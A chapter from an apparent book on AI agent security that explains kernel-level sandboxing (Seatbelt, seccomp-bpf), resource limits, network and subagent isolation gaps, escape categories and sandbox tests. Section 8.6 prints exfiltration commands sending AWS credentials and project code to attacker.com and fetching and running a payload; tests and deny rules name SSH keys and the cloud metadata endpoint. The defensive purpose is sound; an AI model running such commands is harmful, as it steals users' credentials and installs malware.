Chapter 8: Sandbox and Process Isolation

Every security layer discussed in the preceding chapters -- the command parser (Chapter 5), the permission system (Chapter 6), the path validation pipeline (Chapter 7) -- operates at analysis time, before the command or file operation executes. Analysis can be evaded, classifiers can be fooled, and runtime conditions can differ from parse-time assumptions. The sandbox is the last line of defense: it constrains what a process can actually do at execution time, regardless of what any prior layer concluded about its safety.

This chapter examines process isolation for AI agent tool execution: filesystem sandboxing that restricts read/write access at the kernel level, macOS sandbox-exec (Seatbelt) profiles, Linux seccomp-bpf syscall filtering, resource limits that prevent denial-of-service through runaway processes, and the critical gaps that remain in current production systems. We close with a comparative analysis of next-generation sandboxing technologies -- gVisor, Firecracker, and WebAssembly -- and their applicability to AI agent workloads.

8.1 Why Sandboxing Is Non-Negotiable

Every prior security layer has known failure modes:

Layer Known Failure Mode
Command parser Cannot resolve runtime values (variables, aliases, PATH)
Command classifier Cannot analyze encoded payloads inside heredocs or interpreter arguments
Pattern matcher Incomplete database; novel attacks not covered
Permission system User can approve dangerous commands; classifier can be fooled
Path validator TOCTOU races between check and access
AI classifier Subject to prompt injection through conversation context

The sandbox does not analyze commands. It does not classify intent. It does not trust any prior decision. It restricts the operating system capabilities available to the executed process. If every upstream layer fails and a destructive command reaches execution, the sandbox limits the blast radius.

This is the defining property of defense-in-depth: the sandbox's security contribution is independent of every other layer's correctness. A bug in the parser does not weaken the sandbox. A bypass of the classifier does not affect the sandbox. The sandbox operates at the OS kernel level -- below the abstraction layer that upstream defenses and attacker evasion techniques manipulate.

8.2 Filesystem Sandboxing Principles

The most important sandbox restriction is controlling which files a command can read and write. The filesystem sandbox operates on four principles:

Principle 1: Write Restriction to Project Directory

Commands can only write to the project directory and system-designated temporary directories. Writes to any other path are blocked at the kernel level:

Allowed write paths:
  /Users/dev/project/          (project root)
  /tmp/                        (system temporary)
  /private/tmp/                (macOS temporary alias)
  /var/folders/                (macOS per-user temporary)

Denied write paths (everything else):
  /Users/dev/.ssh/             (SSH keys)
  /Users/dev/.aws/             (AWS credentials)
  /Users/dev/.gnupg/           (GPG keys)
  /Users/dev/.kube/            (Kubernetes config)
  /etc/                        (system configuration)
  /usr/                        (system binaries)

Why write restriction matters more than read restriction: A command that reads /etc/passwd leaks information but does not cause permanent damage. A command that writes to /etc/passwd can create backdoor accounts or brick the system. Write restriction prevents the highest-severity attacks -- filesystem destruction, persistence installation, credential modification -- regardless of how the command was classified.

Principle 2: Broad Read Access with Specific Denials

Commands need to read project files, system libraries, language runtimes, and tool binaries. Restricting reads too aggressively breaks legitimate operations:

# This legitimate command reads from multiple locations:
python3 -m pytest tests/
# Reads: /usr/bin/python3, /usr/lib/python3/, site-packages/,
#        project tests/, project source code

The pragmatic approach: allow reads broadly, deny reads to specific sensitive files.

Path Contains Risk If Read
~/.ssh/id_rsa, ~/.ssh/id_ed25519 SSH private keys Remote access compromise
~/.aws/credentials AWS access keys Cloud infrastructure access
~/.kube/config Kubernetes tokens Container orchestration access
.env, .env.production Application secrets API keys, database passwords
~/.gnupg/private-keys-v1.d/ GPG private keys Code signing compromise
/etc/shadow Password hashes Offline password cracking

Principle 3: Deny Overrides Allow

When write-allow and write-deny rules conflict, deny wins. A deny rule for .env inside the project directory overrides the broad project-directory allow. This is the same deny-first evaluation order used in the permission system (Chapter 6), applied at the kernel level.

Principle 4: Path Canonicalization Before Enforcement

Paths are resolved to their canonical form before sandbox rules are applied. This prevents traversal attacks at the sandbox level, complementing the path validation described in Chapter 7. Symlink resolution at the kernel level uses the file's actual inode, not the path string, eliminating the TOCTOU window that plagues user-space path validation.

8.3 macOS Sandbox: Seatbelt Profiles

On macOS, process-level sandboxing uses the sandbox-exec system (Seatbelt). Seatbelt profiles are written in a Scheme-like DSL and compiled to kernel-level enforcement rules in XNU, the macOS kernel.

Profile Structure

;; AI Agent Sandbox Profile (conceptual)
(version 1)

;; Default deny — block everything not explicitly allowed
(deny default)

;; Process execution — must be able to run commands
(allow process-exec)
(allow process-fork)

;; File reads — broadly permitted for development tools
(allow file-read*
  (subpath "/usr")              ; System binaries and libraries
  (subpath "/bin")              ; Core utilities  
  (subpath "/Library")          ; macOS frameworks
  (subpath "/System")           ; System frameworks
  (subpath "/Applications")     ; Installed applications
  (subpath "/opt")              ; Homebrew packages
  (subpath PROJECT_ROOT))       ; Project directory

;; File writes — restricted to project and temp
(allow file-write*
  (subpath PROJECT_ROOT)        ; Project directory
  (subpath "/tmp")              ; System temp
  (subpath "/private/tmp")      ; macOS temp alias
  (subpath "/var/folders"))     ; Per-user temp

;; Deny writes to sensitive project paths
(deny file-write*
  (subpath (string-append PROJECT_ROOT "/.env"))
  (subpath (string-append PROJECT_ROOT "/.git/hooks")))

;; Deny reads to credential files
(deny file-read*
  (subpath (string-append HOME "/.ssh"))
  (subpath (string-append HOME "/.aws"))
  (subpath (string-append HOME "/.gnupg"))
  (literal "/etc/shadow"))

;; Network — allow localhost only
(allow network*
  (local ip "localhost:*")
  (local ip "127.0.0.1:*")
  (local ip "[::1]:*"))

;; Block cloud metadata endpoints
(deny network-outbound
  (remote ip "169.254.169.254:*"))  ; AWS/GCP/Azure IMDS

;; Mach IPC — required for macOS services
(allow mach-lookup
  (global-name "com.apple.system.logger")
  (global-name "com.apple.CoreServices.coreservicesd"))

;; Sysctl — allow read, deny write
(allow sysctl-read)
(deny sysctl-write)

Security Properties

Kernel enforcement. Seatbelt rules are enforced by XNU. A sandboxed process cannot escape by manipulating user-space libraries, changing environment variables, or spawning child processes.

Profile inheritance. When a sandboxed command spawns a child process (e.g., make spawning gcc), the child inherits the parent's sandbox restrictions. This prevents sandbox escape through process spawning.

Deny-default posture. The profile starts with (deny default). New capabilities must be explicitly added, not accidentally inherited.

Seatbelt Weaknesses

Weakness Impact Mitigation
No network content filtering Sandbox allows/denies network access but cannot inspect traffic content Use application-level network controls
Limited IPC control Mach port access difficult to restrict precisely Allow only known-required global names
Deprecated API Apple has deprecated sandbox-exec for third parties Migrate to App Sandbox or Endpoint Security framework
Profile complexity Overly restrictive profiles break legitimate tools Extensive testing with real development workflows
No memory protection Cannot restrict memory allocation or shared memory access Use resource limits (Section 8.5)

The deprecation issue is significant. Apple has deprecated sandbox-exec for third-party applications, recommending the App Sandbox instead. However, App Sandbox requires entitlements embedded in code-signed binaries, which is not practical for sandboxing arbitrary shell commands. Production AI agents on macOS must currently use the deprecated API or implement custom enforcement.

8.4 Linux Sandbox: seccomp-bpf

On Linux, the equivalent kernel-level enforcement uses seccomp-bpf (Secure Computing with Berkeley Packet Filter). seccomp-bpf allows a process to install a filter that restricts which system calls it can make.

Profile for AI Agent Tool Execution

// Conceptual seccomp-bpf filter for AI agent commands
// In practice, implemented via libseccomp for portability

#include <seccomp.h>

scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL_PROCESS); // Default: kill

// Allow basic process operations
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(close), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fstat), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mmap), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mprotect), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(munmap), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(brk), 0);

// Allow file operations (with path restriction via other mechanisms)
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(stat), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(lstat), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(readlink), 0);

// Allow process management
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fork), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(execve), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(wait4), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

// DENY dangerous syscalls explicitly
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(ptrace), 0);   // No debugging
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(mount), 0);    // No mounting
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(reboot), 0);   // No reboot
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(swapon), 0);   // No swap control
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(init_module), 0); // No kernel modules

// Network: allow only local connections
// (seccomp-bpf can filter connect() arguments but this is complex)
// Most implementations combine seccomp with network namespaces

seccomp_load(ctx); // Install filter (irreversible)

Key property: seccomp_load() is irreversible. Once a seccomp filter is installed, the process cannot remove or weaken it. Even if an attacker achieves code execution within the sandboxed process, they cannot escape the seccomp restrictions without a kernel vulnerability.

seccomp-bpf vs Seatbelt Comparison

Property macOS Seatbelt Linux seccomp-bpf
Enforcement level Kernel (XNU) Kernel (Linux)
Filter granularity Path-based file rules Syscall number + args
Path filtering Native (subpath, literal) Requires Landlock LSM
Network filtering IP-based rules Requires network namespaces
Profile language Scheme-like DSL BPF bytecode (via libseccomp)
Profile inheritance Automatic to children Automatic to children
Reversibility Irreversible Irreversible
Ecosystem support Deprecated for 3rd party Widely used (Docker, Chrome, etc.)

The Linux path restriction gap: seccomp-bpf operates at the syscall level -- it can allow or deny openat() calls, but it cannot natively restrict which paths openat() can access. Path-based restrictions on Linux require either:

  1. Landlock LSM (Linux 5.13+): A newer security module that provides path-based access control similar to Seatbelt
  2. Mount namespaces: Create a restricted filesystem view using unshare(CLONE_NEWNS) and bind mounts
  3. User namespaces: Map the process to an unprivileged user with no access outside the project directory

Production AI agents on Linux should combine seccomp-bpf (for syscall restriction) with Landlock or mount namespaces (for path restriction) to achieve equivalent security to macOS Seatbelt.

8.5 Resource Limits

Sandboxing restricts what a process can access. Resource limits restrict how much of the system a process can consume. Without resource limits, a sandboxed process can still deny service by exhausting CPU, memory, file descriptors, or disk space.

Timeout Management

Every command executed by an AI agent must have a timeout. Without timeouts, a process that enters an infinite loop (intentional or accidental) blocks the agent indefinitely.

import { spawn } from 'child_process';

interface ExecutionLimits {
  timeoutMs: number;      // Max wall-clock time (default: 120_000)
  maxOutputBytes: number; // Max stdout+stderr (default: 1_048_576)
}

function executeWithLimits(
  command: string,
  limits: ExecutionLimits
): Promise<ExecutionResult> {
  return new Promise((resolve, reject) => {
    const proc = spawn('bash', ['-c', command], {
      timeout: limits.timeoutMs,
      maxBuffer: limits.maxOutputBytes,
    });

    let stdout = '';
    let stderr = '';
    let outputBytes = 0;

    proc.stdout.on('data', (chunk: Buffer) => {
      outputBytes += chunk.length;
      if (outputBytes <= limits.maxOutputBytes) {
        stdout += chunk.toString();
      }
    });

    proc.stderr.on('data', (chunk: Buffer) => {
      outputBytes += chunk.length;
      if (outputBytes <= limits.maxOutputBytes) {
        stderr += chunk.toString();
      }
    });

    proc.on('exit', (code, signal) => {
      resolve({
        exitCode: code,
        signal,
        stdout: stdout.slice(-limits.maxOutputBytes), // Keep tail
        stderr,
        timedOut: signal === 'SIGTERM',
        truncated: outputBytes > limits.maxOutputBytes,
      });
    });
  });
}

Process Group Management

When a command is killed (timeout, manual cancel), all child processes must also be killed. Without process group management, a timed-out parent leaves orphaned children consuming resources:

const proc = spawn('bash', ['-c', command], {
  detached: true, // Create new process group
});

// Kill the entire process group
function killProcessGroup(pid: number): void {
  try {
    process.kill(-pid, 'SIGTERM'); // Negative PID = process group
    setTimeout(() => {
      try {
        process.kill(-pid, 'SIGKILL'); // Force kill after grace period
      } catch {
        // Process group already exited
      }
    }, 5000);
  } catch {
    // Process group already exited
  }
}

8.6 The Network Isolation Gap

The most significant gap in current AI agent sandboxing is network access. Most production systems allow outbound network connections from sandboxed commands because legitimate tools require network access:

# Legitimate commands requiring network:
git clone https://github.com/user/repo.git
npm install
pip install -r requirements.txt
cargo build  # Downloads crates from crates.io
curl https://api.github.com/repos  # API queries

But unrestricted outbound network access enables data exfiltration:

# Exfiltration through legitimate-looking commands:
curl -X POST https://attacker.com/exfil -d "$(cat ~/.aws/credentials)"
git push https://attacker.com/repo.git  # Push project to attacker's server
wget https://attacker.com/malware -O /tmp/payload && /tmp/payload

Current State of Network Restrictions

Framework Network Restriction Implementation
Claude Code Block cloud metadata (169.254.169.254) Seatbelt/seccomp rule
Docker default Bridge network, no host network Network namespace
Chrome sandbox Per-origin isolation Seccomp + namespace
Most AI agents No restriction N/A

Blocking the cloud metadata endpoint (169.254.169.254) prevents SSRF attacks against AWS IMDS, GCP metadata, and Azure IMDS. But it does not prevent exfiltration to arbitrary internet endpoints.

The implementation requires:

  1. Network namespace isolation: The sandboxed process runs in a separate network namespace with only a loopback interface
  2. Local proxy: A transparent proxy running in the host namespace, accessible via the loopback interface
  3. Domain allowlist: The proxy resolves domain names and checks against an allowlist before forwarding traffic
  4. TLS inspection: For HTTPS traffic, the proxy must either terminate TLS (requires trust certificate injection) or inspect SNI headers

This is complex to implement correctly and introduces latency. No major AI CLI agent has deployed full network isolation in production as of early 2026. The cloud metadata block is the pragmatic minimum.

8.7 Comparing Next-Generation Sandboxing Technologies

Current AI agent sandboxing uses OS-native mechanisms (Seatbelt, seccomp). Next-generation technologies offer stronger isolation at different cost/complexity tradeoffs:

gVisor

Google's gVisor is a container runtime that implements a user-space Linux kernel. Instead of system calls reaching the host kernel, they are intercepted by gVisor's Sentry process, which reimplements Linux syscall semantics.

Strengths for AI agents: - Stronger isolation than seccomp alone (kernel vulnerability in gVisor does not compromise host) - Compatible with existing Linux binaries (no code changes) - Per-sandbox resource accounting

Weaknesses: - Performance overhead: 2-10x slower for syscall-heavy workloads - Incomplete syscall coverage: ~350 of ~450 Linux syscalls implemented - Requires container infrastructure (OCI runtime)

Verdict for AI agents: Suitable for CI/CD and server-side agent execution. Too heavy for developer workstations where latency matters.

Firecracker

Amazon's Firecracker is a micro-VM manager that creates lightweight virtual machines in ~125ms. Each VM runs its own Linux kernel with hardware-enforced isolation.

Strengths for AI agents: - Strongest isolation (hardware-level via KVM) - Full Linux environment inside each VM - Sub-second startup time - Memory-efficient (5MB base overhead per VM)

Weaknesses: - Requires KVM support (Linux host with virtualization) - No macOS support (KVM is Linux-only; macOS has Hypervisor.framework but no Firecracker support) - Filesystem sharing between host and VM adds complexity - Network configuration per VM

Verdict for AI agents: Excellent for multi-tenant server-side agent execution (multiple users sharing infrastructure). Not practical for single-developer workstation use.

WebAssembly (WASM)

WebAssembly provides a sandboxed execution environment with capability-based security (WASI). WASM modules run in a memory-safe virtual machine with explicit imports for every capability.

Strengths for AI agents: - Memory-safe execution (no buffer overflows, no arbitrary memory access) - Capability-based: modules can only access explicitly granted resources - Cross-platform (macOS, Linux, Windows) - Fast startup (~1ms for pre-compiled modules) - Small runtime footprint

Weaknesses: - Limited tool support: most shell commands are not compiled to WASM - WASI filesystem support is still maturing - No native process spawning (cannot run bash -c inside WASM) - Performance overhead for I/O-heavy workloads

Verdict for AI agents: Ideal for sandboxing specific tool implementations (JSON parsers, code formatters, linters) but not for general shell command execution. The inability to run arbitrary shell commands inside WASM makes it unsuitable as the primary sandbox for CLI agents.

8.8 The Subagent Isolation Problem

Multi-agent architectures (Part V of this book) introduce a sandboxing challenge that single-agent systems do not face: isolating agents from each other, not just from the system.

Claude Code's audit (CVSS 7.8, CWE-269) identified that subagents execute in the same Node.js process as the parent CLI:

Subagents share AppState, tool pools, and environment. A malicious or compromised subagent has full access to all parent resources including filesystem, network, and credential storage. The only isolation is tool-name filtering, which is advisory not enforced at the process level.

The audit's recommended fix:

  1. Process-level isolation using child_process.fork() with IPC communication
  2. seccomp/sandbox-exec profiles applied to child processes to restrict syscalls
  3. Capability-based sandboxing with explicit capability tokens per agent:
interface SandboxCapabilities {
  filesystem: 'none' | 'read' | 'readwrite';
  network: 'none' | 'allowed';
  shell: 'none' | 'allowed';
  maxMemoryMB: number;
  maxCpuSeconds: number;
}
  1. Fork depth limits enforced by a counter, not by boilerplate detection:
function spawnSubagent(
  capabilities: SandboxCapabilities,
  currentDepth: number,
  maxDepth: number
): Process {
  if (currentDepth >= maxDepth) {
    throw new SecurityError(
      `Fork depth limit reached: ${currentDepth}/${maxDepth}`
    );
  }

  const child = fork('./agent-runner.js', {
    env: {
      ...minimalEnv(),  // Strip sensitive env vars
      AGENT_DEPTH: String(currentDepth + 1),
      AGENT_MAX_DEPTH: String(maxDepth),
      AGENT_CAPABILITIES: JSON.stringify(capabilities),
    },
    execArgv: [],  // No debug flags in children
  });

  // Apply OS-level sandbox to child process
  applySandboxProfile(child.pid, capabilities);

  return child;
}

The recursive forking vulnerability (CWE-674) is compounded by the fact that fork children retain the Agent tool in their tool pool. Without hard depth limits, a prompt injection that instructs an agent to "create a subagent that creates a subagent that creates a subagent..." can exhaust system resources through exponential process spawning.

8.9 Sandbox Escape Techniques and Defenses

Understanding how sandboxes fail is essential for designing ones that do not. Sandbox escape research from browser security, container security, and mobile app security applies directly to AI agent sandboxing.

Escape Category 1: Kernel Vulnerabilities

Both Seatbelt and seccomp-bpf enforce restrictions in the kernel. A kernel vulnerability that allows privilege escalation or arbitrary code execution in kernel space bypasses all sandbox restrictions. This is the fundamental limitation of OS-level sandboxing: the kernel is the trusted computing base, and a compromised kernel means a compromised sandbox.

CVE Type Impact
CVE-2021-22555 Linux Netfilter heap OOB write Container escape via kernel exploit
CVE-2022-0185 Linux filesystem context heap overflow Namespace escape to root
CVE-2023-32434 macOS XNU kernel memory corruption Sandbox escape on iOS/macOS

Defense: Minimize the kernel attack surface exposed to sandboxed processes. seccomp-bpf helps by blocking syscalls that are not needed -- if the sandboxed process cannot call mount(), ptrace(), or init_module(), kernel vulnerabilities in those subsystems are unreachable. gVisor goes further by reimplementing syscalls in user space, so kernel bugs in unimplemented syscalls are irrelevant.

Escape Category 2: Resource Side Channels

Even a perfectly isolated process can communicate with the outside world through resource side channels:

  • Timing channels: A sandboxed process can modulate CPU usage to encode information that another process observes through scheduling latency
  • Filesystem metadata: File creation timestamps, inode numbers, and directory sizes leak information between sandboxed processes sharing a filesystem
  • Memory pressure: A sandboxed process that allocates and frees memory rapidly causes observable memory pressure on the host

These channels are low-bandwidth (bytes to kilobytes per second) but sufficient for exfiltrating credentials or encryption keys.

Defense: Resource side channels cannot be fully eliminated without hardware isolation (Firecracker/VMs). For AI agents, the practical mitigation is to ensure sandboxed processes do not share filesystems or observe each other's scheduling behavior. Running each agent command in a separate cgroup with isolated CPU and memory budgets reduces bandwidth.

Escape Category 3: IPC and Signal Channels

On both macOS and Linux, inter-process communication mechanisms can breach sandbox boundaries:

  • Unix domain sockets: If a socket path is inside the allowed write directory, the sandboxed process can communicate with any process that connects
  • Mach ports (macOS): Overly permissive Mach port access allows IPC with system services
  • Signals: A sandboxed process can send signals to processes in the same user space

Defense: Restrict IPC mechanisms explicitly in the sandbox profile. On macOS, limit mach-lookup to specific global names. On Linux, use PID namespaces to prevent the sandboxed process from seeing or signaling other processes.

8.10 Sandbox Testing and Validation

A sandbox profile that is never tested is a sandbox profile that does not work. Production AI agents need automated tests that verify sandbox enforcement:

// Sandbox validation test suite
describe('Sandbox Enforcement', () => {
  it('blocks writes outside project directory', async () => {
    const result = await executeInSandbox('touch /tmp/../root/test');
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain('Operation not permitted');
  });

  it('blocks reading SSH keys', async () => {
    const result = await executeInSandbox('cat ~/.ssh/id_rsa');
    expect(result.exitCode).not.toBe(0);
  });

  it('allows writes within project directory', async () => {
    const result = await executeInSandbox('touch project/test.txt');
    expect(result.exitCode).toBe(0);
  });

  it('blocks cloud metadata access', async () => {
    const result = await executeInSandbox(
      'curl -s http://169.254.169.254/latest/meta-data/'
    );
    expect(result.exitCode).not.toBe(0);
  });

  it('enforces timeout on long-running commands', async () => {
    const start = Date.now();
    const result = await executeInSandbox('sleep 300', { timeoutMs: 5000 });
    const elapsed = Date.now() - start;
    expect(elapsed).toBeLessThan(10000);
    expect(result.timedOut).toBe(true);
  });

  it('kills entire process group on timeout', async () => {
    const result = await executeInSandbox(
      'bash -c "sleep 300 & sleep 300 & wait"',
      { timeoutMs: 2000 }
    );
    // Verify no orphaned processes remain
    const orphans = await findProcessesByGroup(result.pgid);
    expect(orphans).toHaveLength(0);
  });
});

Sandbox tests should run in CI/CD as part of the agent's test suite. A failing sandbox test is a deployment blocker -- it indicates that a security boundary is not enforced.

8.12 Key Takeaways

The sandbox is the last line of defense in the AI agent security stack. It operates at the kernel level, below the abstraction layer that upstream defenses manipulate, providing security guarantees that are independent of every other layer's correctness.

macOS Seatbelt and Linux seccomp-bpf provide kernel-enforced restrictions with near-zero performance overhead. Both support deny-default profiles with explicit capability allowlists. Both enforce profile inheritance to child processes, preventing sandbox escape through process spawning.

The critical gaps are network isolation (most agents allow outbound connections) and subagent isolation (most agents share process space between parent and child agents). Network isolation requires namespace-based proxy architectures that no major agent has deployed. Subagent isolation requires process-level separation with capability attenuation, replacing the current advisory-only name-based tool filtering.

Next-generation technologies (gVisor, Firecracker, WASM) offer stronger isolation at higher complexity and cost. The right choice depends on deployment context: OS-native sandboxes for workstations, container-based sandboxes for CI/CD, micro-VMs for multi-tenant infrastructure, and WASM for specific tool implementations.

As discussed throughout Part II, the security of a single AI agent depends on the cooperation of multiple defense layers: command parsing (Chapter 5), permission evaluation (Chapter 6), path validation (Chapter 7), and process sandboxing (this chapter). No single layer is sufficient. The security guarantee emerges from the independence and completeness of the entire stack. Part III shifts focus from tool-level security to a different attack surface: authentication, credential management, and secret protection in AI agent systems.
